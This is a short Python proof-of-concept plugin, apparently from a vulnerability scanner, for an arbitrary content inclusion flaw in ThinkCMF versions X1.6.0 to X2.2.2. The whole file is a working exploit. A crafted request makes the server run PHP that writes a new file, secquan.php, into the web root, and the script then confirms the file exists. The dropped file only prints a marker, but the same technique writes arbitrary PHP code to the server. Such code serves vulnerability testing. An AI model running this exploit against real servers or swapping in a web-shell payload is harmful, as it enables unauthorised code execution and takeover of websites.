#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""

"""
ThinkCMF框架的任意内容包含漏洞可shell
    ThinkCMF X1.6.0
    ThinkCMF X2.1.0
    ThinkCMF X2.2.0
    ThinkCMF X2.2.1
    ThinkCMF X2.2.2
refer: https://www.freebuf.com/vuls/217586.html
author: B1ain
"""
from lib.core.Request import request
from plugin.target_parse import get_standard_url

url_payload = """/?a=fetch&templateFile=public/index&prefix=''&content=<php>file_put_contents('secquan.php',base64_decode('PD9waHAgZWNobygiYnVnIGV4aXN0Iik7Pz4='))</php>"""

def poc(url):
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    }
    target = get_standard_url(url)
    url = target + url_payload
    try:
        res = request.get(url, headers=headers, timeout=5, allow_redirects=False, verify=False)
        if res.status_code == 200:
            url2 = target + "/secquan.php"
            res2 = request.get(url2, headers=headers, timeout=5, allow_redirects=False, verify=False)
            if "bug exist" in res2.text:
                return target + "/secquan.php"
    except:
        pass
    return False
